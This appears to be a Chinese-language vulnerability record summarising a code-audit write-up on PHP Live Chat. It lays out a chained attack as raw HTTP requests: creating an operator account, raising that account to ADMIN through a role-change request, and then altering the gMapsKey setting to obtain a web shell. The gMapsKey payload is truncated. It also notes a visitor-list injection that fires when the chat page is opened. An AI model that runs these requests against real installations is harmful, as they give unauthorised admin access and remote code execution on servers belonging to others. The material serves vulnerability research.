# PHP-Live-Chat代码审计之组合拳GetShell

- **系统**：PHP　|　**类型**：其他　|　**CVE**：—
- **请求**：`POST /php/app.php?mobile-operator-create HTTP/1.1`
- **关键头**：`Host: localhost`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`Content-Length: 61`

**请求体 / payload**
```
PHP Live Chat 全名为 PHP Live Support Chat，官方网站[https://livechat.mirrormx.net/](https://www.t00ls.com/link.html?url=https://livechat.mirrormx.net/)，目前有三个版本lite、普通和pro。
roles=OPERATOR&name=mrfool&mail=mrfool%40x.xx&password=111111
登录创建的账号后，修改当前ID权限为ADMIN和OPERATOR
Host: localhost
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie:PHPSESSID=ikglrk04j3d85ivhrdhme8pv7p;
Content-Length: 26
id=28&roles=ADMIN,OPERATOR
使用ADMIN权限的账号（权限修改后需重新登录获取PHPSESSID）修改gMapsKey从而实现GetShell
Host: localhost
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie:PHPSESSID=s5vj6oib3agt4h9q…（脚本共 1418 字，完整版见原文）
```

**其他**
- 6.外部访客列表未解析: 进入聊天页面触发